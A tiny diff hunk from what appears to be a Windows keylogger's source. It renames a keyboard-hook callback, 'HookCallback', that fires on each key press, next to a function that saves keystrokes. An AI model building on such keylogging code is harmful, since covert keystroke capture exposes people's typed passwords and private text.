@@ -219,7 +219,7 @@ int Save(int key_strokes){
 
 
 //Triggered every time a key is pressed
-LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0 && wParam == WM_KEYDOWN)
 	{
